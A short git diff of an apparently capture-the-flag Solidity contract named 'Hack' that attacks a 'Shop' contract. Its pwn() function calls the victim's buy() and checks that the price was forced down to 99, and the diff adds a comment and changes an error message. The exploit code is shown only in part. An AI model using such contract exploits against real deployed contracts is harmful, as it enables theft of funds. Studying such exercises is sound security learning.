@@ -25,9 +25,10 @@ contract Hack{
     constructor(address _victimAddr){
         victim = Shop(_victimAddr);
     }
+    // this will be the function that will break the Shop contract
     function pwn() external{
         victim.buy();
-        require(victim.price() == 99, "Price != 99");
+        require(victim.price() == 99, "price != 99");
     }
 
     function price() external view returns (uint){
